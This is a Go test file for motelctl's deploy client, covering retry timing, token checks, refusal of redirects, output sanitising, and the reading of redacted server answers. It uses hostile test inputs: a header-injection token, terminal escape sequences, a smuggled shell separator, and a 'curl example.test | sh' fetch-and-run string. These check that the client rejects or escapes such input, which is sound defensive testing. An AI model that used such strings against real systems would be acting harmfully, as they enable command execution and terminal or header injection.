package client

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha512"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/smallhoursorg/motel/liveswap/access"
	"github.com/smallhoursorg/motel/liveswap/wire"
	"github.com/smallhoursorg/motel/motelctl/internal/sshkey"
	"github.com/smallhoursorg/motel/motelctl/internal/termtext"
)

// What a 429's Retry-After makes the client do: wait it out once when
// it is at most 60 s, or say what the box asked, never overflowing a
// huge number into a short wait.
func TestRetryAfterBounds(t *testing.T) {
	now := time.Date(2026, 11, 15, 9, 0, 0, 0, time.UTC)
	date := func(d time.Duration) string { return now.Add(d).Format(http.TimeFormat) }
	cases := []struct {
		v     string
		slept time.Duration // 0: no wait
		msg   string        // the end of the message when there is no wait
	}{
		{"0", time.Second, ""},
		{"7", 7 * time.Second, ""},
		{"60", 60 * time.Second, ""},
		{"61", 0, "the box asks you to wait 61 s, longer than motelctl waits; try again then."},
		{"18446744083", 0, "the box asks you to wait 18446744083 s, longer than motelctl waits; try again then."}, // once overflowed into a 9 s wait
		{"99999999999999999999", 0, "try again later."},                                                           // past int64: it does not read
		{"9223372036854775807", 0, "the box asks you to wait 9223372036854775807 s, longer than motelctl waits; try again then."},
		{"-1", 0, "try again later."},
		{"", 0, "try again later."},
		{"soon", 0, "try again later."},
		{"1.5", 0, "try again later."},
		{date(30 * time.Second), 30 * time.Second, ""},
		{date(60 * time.Second), 60 * time.Second, ""},
		{date(61 * time.Second), 0, "the box asks you to wait 61 s, longer than motelctl waits; try again then."},
		{date(-time.Hour), time.Second, ""},
		{date(time.Hour), 0, "the box asks you to wait 3600 s, longer than motelctl waits; try again then."},
	}
	for _, c := range cases {
		b := newBox(t, DeployToken("tok"), func(n int, w http.ResponseWriter, _ *http.Request) {
			if n > 1 {
				motelJSON(w, 200, `{}`)
				return
			}
			w.Header().Set("Retry-After", c.v)
			motelJSON(w, 429, `{"error":"slow down"}`)
		})
		b.client.Now = func() time.Time { return now }
		_, err := b.client.Get(context.Background(), "/blog", nil)
		if c.slept != 0 {
			if err != nil || len(b.slept) != 1 || b.slept[0] != c.slept {
				t.Errorf("Retry-After %q: err %v, slept %v; want one wait of %s", c.v, err, b.slept, c.slept)
			}
			continue
		}
		if f := failure(t, err); len(b.slept) != 0 || f.Exit != ExitUnknown || !strings.HasSuffix(f.Message, c.msg) {
			t.Errorf("Retry-After %q: slept %v, exit %d %q; want no wait and %q", c.v, b.slept, f.Exit, f.Message, c.msg)
		}
	}
}

func TestNewDeployToken(t *testing.T) {
	if tok, err := NewDeployToken("eyJhbGciOiJFZERTQSJ9.eyJhdWQiOiJibG9nIn0.c2ln"); err != nil || tok == "" { // gitleaks:allow — made up for this test
		t.Fatalf("a JWT refused: %v", err)
	}
	for _, v := range []string{"s3cr3t\nX-Evil: 1", "s3cr3t en", "s3cr3t\r", "s3cr3t\x00", "s3cr3t\x1b", "s3cr3t\x7f", "s3cr3t\xc3\xb6", "s3cr3t\t"} {
		_, err := NewDeployToken(v)
		f := failure(t, err)
		if f.Exit != ExitUsage || !strings.HasPrefix(f.Message, "MOTEL_TOKEN holds something that is not a token") || strings.Contains(f.Message, "s3cr3t") {
			t.Errorf("%q: exit %d %q; want 2, and the value never quoted", v, f.Exit, f.Message)
		}
	}
}

// A redirect is never followed: whatever it points at, same host or
// another, https or http, no request reaches it, so no token does.
func TestRedirectsAreNeverFollowed(t *testing.T) {
	var reached atomic.Int32
	target := func(w http.ResponseWriter, r *http.Request) {
		reached.Add(1)
		if r.Header.Get("Authorization") != "" {
			t.Errorf("a redirect target got Authorization %q", r.Header.Get("Authorization"))
		}
		motelJSON(w, 200, `{}`)
	}
	other := httptest.NewTLSServer(http.HandlerFunc(target))
	defer other.Close()
	plain := httptest.NewServer(http.HandlerFunc(target))
	defer plain.Close()
	for _, to := range []string{"/elsewhere", other.URL + "/blog", plain.URL + "/blog"} {
		t.Run(to, func(t *testing.T) {
			b := newBox(t, DeployToken("tok"), func(_ int, w http.ResponseWriter, r *http.Request) {
				if r.URL.Path == "/elsewhere" {
					target(w, r)
					return
				}
				http.Redirect(w, r, to, http.StatusFound)
			})
			// Trust both TLS servers, so only the rule stops the
			// redirect, not a certificate.
			pool := x509.NewCertPool()
			pool.AddCert(b.srv.Certificate())
			pool.AddCert(other.Certificate())
			b.client.HTTP = NewHTTP(&http.Transport{TLSClientConfig: &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}})
			ans, err := b.client.Get(context.Background(), "/blog", nil)
			if err != nil {
				t.Fatal(err)
			}
			f := failure(t, b.client.Read(ans, &struct{}{}))
			if ans.Code != http.StatusFound || f.Exit != ExitUnknown {
				t.Errorf("answer %d, exit %d; want the 302 itself, read as not motel's", ans.Code, f.Exit)
			}
		})
	}
	if n := reached.Load(); n != 0 {
		t.Fatalf("%d requests followed a redirect", n)
	}
}

// memSign signs as ssh-keygen -Y sign does, with an ed25519 key in
// memory.
type memSign struct{ s ssh.Signer }

func (m memSign) Sign(_ context.Context, _ sshkey.Key, ns string, msg []byte) ([]byte, error) {
	h := sha512.Sum512(msg)
	sig, err := m.s.Sign(rand.Reader, append([]byte("SSHSIG"), ssh.Marshal(struct {
		NS       string
		Reserved []byte
		Alg      string
		Hash     []byte
	}{ns, nil, "sha512", h[:]})...))
	if err != nil {
		return nil, err
	}
	blob := append([]byte("SSHSIG"), ssh.Marshal(struct {
		V        uint32
		Key      []byte
		NS       string
		Reserved []byte
		Alg      string
		Sig      []byte
	}{1, m.s.PublicKey().Marshal(), ns, nil, "sha512", ssh.Marshal(sig)})...)
	return []byte("-----BEGIN SSH SIGNATURE-----\n" + base64.StdEncoding.EncodeToString(blob) + "\n-----END SSH SIGNATURE-----\n"), nil
}

type recordTrip struct{ req *http.Request }

func (r *recordTrip) RoundTrip(req *http.Request) (*http.Response, error) {
	r.req = req
	return &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"application/json"}}, Body: io.NopCloser(strings.NewReader("{}\n")), Request: req}, nil
}

// A box reached on another port than 443 is still the bare host to a
// token: aud names the box, and the box's checker takes the token with
// the port in Host.
func TestPersonTokenAudIsTheBareHost(t *testing.T) {
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	s, err := ssh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	pk, err := sshkey.ParsePublic(string(ssh.MarshalAuthorizedKey(s.PublicKey())))
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now()
	box := Box{Host: "deploy.example.test", Port: "8443"}
	rec := &recordTrip{}
	c := &Client{Box: box, Cred: &PersonToken{Key: sshkey.Key{Public: pk}, Signer: memSign{s}, Box: box, Now: func() time.Time { return now }},
		HTTP: &http.Client{Transport: rec}, Now: time.Now}
	if _, err := c.Get(context.Background(), "/blog", nil); err != nil {
		t.Fatal(err)
	}
	if rec.req.URL.Host != "deploy.example.test:8443" {
		t.Fatalf("asked %s", rec.req.URL.Host)
	}
	lookup := func(fp string) (ssh.PublicKey, bool) {
		return s.PublicKey(), fp == ssh.FingerprintSHA256(s.PublicKey())
	}
	req := access.TokenRequest{Authorization: rec.req.Header.Values("Authorization"), Method: rec.req.Method, Host: rec.req.URL.Host}
	listed := func(keyType string) bool { return keyType == s.PublicKey().Type() }
	if _, err := access.CheckToken(req, "deploy.example.test", now, lookup, listed); err != nil {
		t.Fatalf("the box refused a token sent to %s: %v", req.Host, err)
	}
}

// Every reason motelctl quotes from something it did not write is
// made safe to print: the certificate's, a decoder's, a dialer's.
func TestReasonsAreSanitised(t *testing.T) {
	const evil = "evil\x1b]0;pwned\x07"
	c := &Client{Box: Box{Host: "deploy.example.com"}}
	ctx := context.Background()
	cert := &x509.Certificate{DNSNames: []string{evil}}
	for name, err := range map[string]error{
		"certificate":    &url.Error{Op: "Get", URL: "https://deploy.example.com/", Err: &tls.CertificateVerificationError{Err: x509.HostnameError{Certificate: cert, Host: "deploy.example.com"}}},
		"name not found": &url.Error{Op: "Get", URL: "https://deploy.example.com/", Err: &net.OpError{Op: "dial", Err: &net.DNSError{Err: evil, Name: "deploy.example.com"}}},
	} {
		f := failure(t, c.unreachable(ctx, err))
		if strings.ContainsAny(f.Message, "\x1b\x07") || !strings.Contains(f.Message, `evil\x1b]0;pwned\x07`) {
			t.Errorf("%s: %q", name, f.Message)
		}
	}
	// Past the dial, the transport's words are not printed at all.
	if f := failure(t, c.unreachable(ctx, &url.Error{Op: "Get", URL: "https://deploy.example.com/", Err: errors.New(evil)})); strings.Contains(f.Message, "evil") {
		t.Errorf("unreachable: %q", f.Message)
	}
	f := failure(t, c.notMotel(&Answer{Code: 200}, evil))
	if strings.ContainsAny(f.Message, "\x1b\x07") || !strings.Contains(f.Message, `evil\x1b]0;pwned\x07`) {
		t.Errorf("not motel's: %q", f.Message)
	}
}

// What is read of an answer is capped.
func TestBodyCap(t *testing.T) {
	for _, size := range []int{maxBody, maxBody + 1} {
		b := newBox(t, DeployToken("tok"), func(_ int, w http.ResponseWriter, _ *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write(bytes.Repeat([]byte(" "), size))
		})
		_, err := b.client.Get(context.Background(), "/blog", nil)
		if size == maxBody {
			if err != nil {
				t.Errorf("%d bytes: %v", size, err)
			}
			continue
		}
		if f := failure(t, err); f.Exit != ExitUnknown || !strings.Contains(f.Message, "answered with more than 4194304 bytes") {
			t.Errorf("exit %d %q", f.Exit, f.Message)
		}
	}
}

// A 200 is the answer asked for only with the fields that make it one;
// an unknown extra field is taken, as a newer box sends them.
func TestReadNeedsTheIdentifyingFields(t *testing.T) {
	c := &Client{Box: Box{Host: "127.0.0.1"}}
	json200 := func(body string) *Answer {
		return &Answer{Code: 200, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body + "\n")}
	}
	status := `{"app":"blog","phase":"idle","available_versions":[],"added_later":{"x":1}}`
	record := `{"version":"v1","status":"succeeded","started_at":"2026-11-14T09:12:30Z","finished_at":"2026-11-14T09:13:00Z","artifact_entries":0,"artifact_bytes":0}`
	box := `{"commit":"3f9c2a1e00000000000000000000000000000000","box_webhook":"deploy.example.com","sha256":"` + strings.Repeat("9b", 32) + `"}`
	cases := []struct {
		name string
		v    any
		body string
		ok   bool
	}{
		{"a status", &wire.Status{}, status, true},
		{"a deploy record", &wire.DeployResult{}, record, true},
		{"a box status", &wire.BoxStatus{}, box, true},
		{"an empty object as a status", &wire.Status{}, `{}`, false},
		{"another object as a deploy record", &wire.DeployResult{}, `{"ok":true}`, false},
		{"an app's status as the box's", &wire.BoxStatus{}, status, false},
		{"the box's status as an app's", &wire.Status{}, box, false},
		{"an empty phase", &wire.Status{}, `{"app":"blog","phase":""}`, false},
	}
	for _, tc := range cases {
		err := c.Read(json200(tc.body), tc.v)
		if tc.ok {
			if err != nil {
				t.Errorf("%s: %v", tc.name, err)
			}
			continue
		}
		if f := failure(t, err); f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer: it has no ") {
			t.Errorf("%s: exit %d %q", tc.name, f.Exit, f.Message)
		}
	}
	// motel's answer by its fields, with a time the response filter
	// replaced: said as that, not as someone else's answer.
	replaced := strings.Replace(record, `"2026-11-14T09:13:00Z"`, `"[redacted:DB_PASSWORD]"`, 1)
	f := failure(t, c.Read(json200(replaced), &wire.DeployResult{}))
	if f.Exit != ExitUnknown || strings.Contains(f.Message, "not motel's") || f.Message != "127.0.0.1 answered, but its finished_at could not be read: the box's response filter may have replaced it. The box's journal says which key it replaced." {
		t.Errorf("a replaced time: exit %d %q", f.Exit, f.Message)
	}
}

// A certificate that does not verify while SSL_CERT_FILE or
// SSL_CERT_DIR is set names the variable: its roots replace the
// system's.
func TestCertificateFailureNamesTheRoots(t *testing.T) {
	err := &url.Error{Op: "Get", URL: "https://deploy.example.com/", Err: &tls.CertificateVerificationError{Err: x509.UnknownAuthorityError{}}}
	c := &Client{Box: Box{Host: "deploy.example.com"}, Roots: []string{"SSL_CERT_FILE=/tmp/ca\x1b[2J.pem"}}
	f := failure(t, c.unreachable(context.Background(), err))
	if f.Exit != ExitCertificate || strings.ContainsRune(f.Message, '\x1b') ||
		!strings.Contains(f.Message, `SSL_CERT_FILE=/tmp/ca\x1b[2J.pem is set, and replaces the system's roots with the ones it names: that is the likelier cause.`) {
		t.Fatalf("exit %d %q", f.Exit, f.Message)
	}
	c.Roots = nil
	if f := failure(t, c.unreachable(context.Background(), err)); strings.Contains(f.Message, "SSL_CERT") {
		t.Fatalf("no variable set, and one named: %q", f.Message)
	}
}

// MOTEL_TOKEN goes only to MOTEL_URL's box when MOTEL_URL is set.
func TestTokenFor(t *testing.T) {
	env := func(u string) func(string) string { return func(string) string { return u } }
	if err := TokenFor(Box{Host: "a.example.com"}, env("")); err != nil {
		t.Errorf("no MOTEL_URL: %v", err)
	}
	if err := TokenFor(Box{Host: "a.example.com"}, env("https://A.example.com:443/blog")); err != nil {
		t.Errorf("the same box: %v", err)
	}
	for _, b := range []Box{{Host: "b.example.com"}, {Host: "a.example.com", Port: "8443"}} {
		f := failure(t, TokenFor(b, env("https://a.example.com/blog")))
		if f.Exit != ExitUsage || !strings.HasPrefix(f.Message, "the token in MOTEL_TOKEN belongs with MOTEL_URL's box, a.example.com, and this command asks "+b.Addr()) {
			t.Errorf("%s: exit %d %q", b.Addr(), f.Exit, f.Message)
		}
	}
}

// okJSON is a 200 with body as its JSON.
func okJSON(body string) *Answer {
	return &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body + "\n")}
}

// A value the box's own response filter replaced part of carries the
// filter's marker and is outside its grammar. It is motel's answer all
// the same: the value becomes the client's own words, Filtered, and
// nothing of what the box sent in it is kept. An app whose env_file
// holds its own name (DB_NAME=<app>) has that name replaced inside its
// unit on every status.
func TestReadTakesWhatTheFilterReplaced(t *testing.T) {
	c := &Client{Box: Box{Host: "127.0.0.1"}}
	var st wire.Status
	body := `{"app":"billingapp","phase":"idle","current_version":"rel-[redacted:STAGE]","unit":"motel-[redacted:DB_NAME].v1.0a1b2c3d0a1b2c3d.service",` +
		`"deploys":[{"version":"rel-[redacted:STAGE]","status":"succeeded"},{"version":"v1","status":"failed","phase":"soaking"}],` +
		`"last_deploy":{"version":"[masked, 24 chars]","status":"succeeded","started_at":"2026-11-14T09:12:30Z","finished_at":"2026-11-14T09:13:00Z","artifact_entries":0,"artifact_bytes":0},` +
		`"watchdog":{"state":"[redacted:FEATURE_FLAG,OTHER]"},"available_versions":["rel-[redacted:STAGE]","v1"]}`
	if err := c.Read(okJSON(body), &st); err != nil {
		t.Fatalf("a status the filter replaced values in: %v", err)
	}
	for what, got := range map[string]string{
		"current_version": st.CurrentVersion, "unit": st.Unit, "deploys[0].version": st.Deploys[0].Version,
		"last_deploy.version": st.LastDeploy.Version, "watchdog.state": st.Watchdog.State, "available_versions[0]": st.AvailableVersions[0],
	} {
		if got != Filtered {
			t.Errorf("%s is %q, want %q", what, got, Filtered)
		}
	}
	if st.Deploys[1].Version != "v1" || st.AvailableVersions[1] != "v1" || st.App != "billingapp" {
		t.Errorf("a value in its grammar was changed: %+v", st)
	}

	// Every spelling of a marker the filter writes (redact.go's
	// chooseMarker falls back when a key is named for its own value),
	// with one key or several.
	for _, mark := range []string{"[redacted:DB_NAME]", "[redacted:A,B_2,c]", "[REDACTED:shop]", "[withheld:shop]", "<shop removed>", "<a,b removed>", "[#1]", "[#12]",
		"[redacted:" + strings.Repeat("K,", 200) + "K]", "[masked, 20 chars]", "[redacted:private-key]",
		// A key name that looks generated is masked inside its own label.
		"[redacted:[masked, 24 chars]]", "[redacted:A,[masked, 24 chars],B]", "[withheld:[masked, 24 chars]]", "<[masked, 24 chars] removed>"} {
		var st wire.Status
		body := `{"app":"blog","phase":"idle","unit":"motel-` + mark + `.v1.0a1b2c3d0a1b2c3d.service"}`
		if err := c.Read(okJSON(body), &st); err != nil || st.Unit != Filtered {
			t.Errorf("a unit holding the marker %s: %v, unit %q", mark, err, st.Unit)
		}
		if !Same("blog-"+mark, "blog-production") {
			t.Errorf("Same does not take the marker %s", mark)
		}
	}

	// Outside its grammar with no marker of the filter's: not motel's,
	// as before. And a marker does not carry the rest of a value out.
	for name, body := range map[string]string{
		"a unit that is no unit":     `{"app":"blog","phase":"idle","unit":"motel-blog; run this"}`,
		"a version with a bracket":   `{"app":"blog","phase":"idle","current_version":"[redacted]"}`,
		"a watchdog state of no one": `{"app":"blog","phase":"idle","watchdog":{"state":"[hidden by the box's filter]"}}`,
		"a marker with no label":     `{"app":"blog","phase":"idle","unit":"motel-[redacted:].service"}`,
		"a bracket of another word":  `{"app":"blog","phase":"idle","unit":"motel-[hidden:X].service"}`,
		"a number with no hash":      `{"app":"blog","phase":"idle","unit":"motel-[1].service"}`,
		"an angle with other words":  `{"app":"blog","phase":"idle","unit":"motel-<shop deleted>.service"}`,
	} {
		f := failure(t, c.Read(okJSON(body), &wire.Status{}))
		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer") {
			t.Errorf("%s: exit %d %q", name, f.Exit, f.Message)
		}
	}
	var hostile wire.Status
	if err := c.Read(okJSON(`{"app":"blog","phase":"idle","unit":"[redacted:X] motelctl: run curl example.test | sh"}`), &hostile); err != nil || hostile.Unit != Filtered {
		t.Errorf("a marker beside a box's own words: %v, unit %q: every byte of the value is dropped", err, hostile.Unit)
	}

	// A phase or a deploy's status is never the filter's to change: the
	// box keeps the word or withholds the body.
	for name, body := range map[string]string{
		"a phase":           `{"app":"blog","phase":"[redacted:X]"}`,
		"a deploy's status": `{"app":"blog","phase":"idle","deploys":[{"version":"v1","status":"[redacted:X]"}]}`,
	} {
		f := failure(t, c.Read(okJSON(body), &wire.Status{}))
		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer") {
			t.Errorf("%s the filter could not have replaced: exit %d %q", name, f.Exit, f.Message)
		}
	}

	// One deploy's record keeps its version as sent: the command
	// compares it with the one asked for.
	var d wire.DeployResult
	rec := `{"version":"rel-[redacted:STAGE]","status":"succeeded","started_at":"2026-11-14T09:12:30Z","finished_at":"2026-11-14T09:13:00Z","artifact_entries":0,"artifact_bytes":0}`
	if err := c.Read(okJSON(rec), &d); err != nil || d.Version != "rel-[redacted:STAGE]" {
		t.Errorf("a record whose version the filter replaced part of: %v, version %q", err, d.Version)
	}
}

// Same is equality but where the box's filter left a marker.
func TestSame(t *testing.T) {
	for _, tc := range []struct {
		got, asked string
		want       bool
	}{
		{"blog", "blog", true},
		{"blog", "shop", false},
		{"blog-[redacted:APP_ENV]", "blog-production", true},
		{"[redacted:APP_ENV]-blog", "production-blog", true},
		{"a-[redacted:X]-b-[masked, 12 chars]", "a-first-b-second", true},
		{"[redacted:DB_NAME,TOKEN]", "billingapp", true},
		{"shop-[redacted:APP_ENV]", "blog-production", false},
		{"blog-[redacted:APP_ENV]", "blog-", false}, // a marker stands for some text
		{"blog-[redacted:APP_ENV]x", "blog-production", false},
		{"b.og-[redacted:APP_ENV]", "blog-production", false}, // the rest is compared as written
		{"blog-[redacted]", "blog-production", false},         // not a marker of the filter's
		{"", "blog", false},
	} {
		if got := Same(tc.got, tc.asked); got != tc.want {
			t.Errorf("Same(%q, %q) = %v, want %v", tc.got, tc.asked, got, tc.want)
		}
	}
}

// A 200 whose body is the one the box's response filter writes in
// place of an answer it withheld is said as that, with the box's
// sentence, which names what to mend, and its body is the box's for
// --json. Any other 200 without the answer's fields is not motel's.
func TestReadSaysWhatTheFilterWithheld(t *testing.T) {
	c := &Client{Box: Box{Host: "127.0.0.1"}}
	for _, said := range []string{
		"response withheld: the app's env_file could not be read, so its values are unknown to the filter (open /etc/motel/secrets/blog.env: permission denied)",
		"response withheld: a redacted value overlapped the response's own outcome",
		"[#0]",
	} {
		for _, v := range []any{&wire.Status{}, &wire.DeployResult{}} {
			b, err := json.Marshal(wire.Error{Error: said})
			if err != nil {
				t.Fatal(err)
			}
			body := string(b)
			f := failure(t, c.Read(okJSON(body), v))
			if f.Exit != ExitFailed || f.Message != "127.0.0.1 withheld its answer; the box says: "+termtext.Quote(said).String() || string(f.Body) != body+"\n" {
				t.Errorf("%T, %q: exit %d %q body %q", v, said, f.Exit, f.Message, f.Body)
			}
		}
	}
	// The filter's sentence passes its own last pass: a value that is
	// one of its opening words stands there as a marker.
	for _, said := range []string{
		"[redacted:MODE] withheld: a redacted value overlapped the response's own outcome",
		"response [redacted:STATE]: a redacted value overlapped the response's own structure",
		"[#1]: a redacted value overlapped the response's own structure",
	} {
		b, err := json.Marshal(wire.Error{Error: said})
		if err != nil {
			t.Fatal(err)
		}
		if f := failure(t, c.Read(okJSON(string(b)), &wire.Status{})); f.Exit != ExitFailed || !strings.Contains(f.Message, "withheld its answer; the box says: ") {
			t.Errorf("%q: exit %d %q", said, f.Exit, f.Message)
		}
	}
	withKeys := `{"error":"response withheld: a redacted value overlapped the response's own structure","redacted_env":["DB_NAME"]}`
	if f := failure(t, c.Read(okJSON(withKeys), &wire.Status{})); f.Exit != ExitFailed || !strings.Contains(f.Message, "withheld its answer; the box says: \"response withheld: a redacted value") {
		t.Errorf("a withheld body naming its keys: exit %d %q", f.Exit, f.Message)
	}
	for name, body := range map[string]string{
		"another server's error":        `{"error":"upstream timed out"}`,
		"the words not at the start":    `{"error":"note: response withheld"}`,
		"a marker and other words":      `{"error":"[redacted:X] timed out: upstream"}`,
		"other words before the colon":  `{"error":"response withheld by a proxy: upstream"}`,
		"a withheld body with no error": `{"redacted_env":["DB_NAME"]}`,
	} {
		f := failure(t, c.Read(okJSON(body), &wire.Status{}))
		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer: it has no app and phase") {
			t.Errorf("%s: exit %d %q", name, f.Exit, f.Message)
		}
	}
}
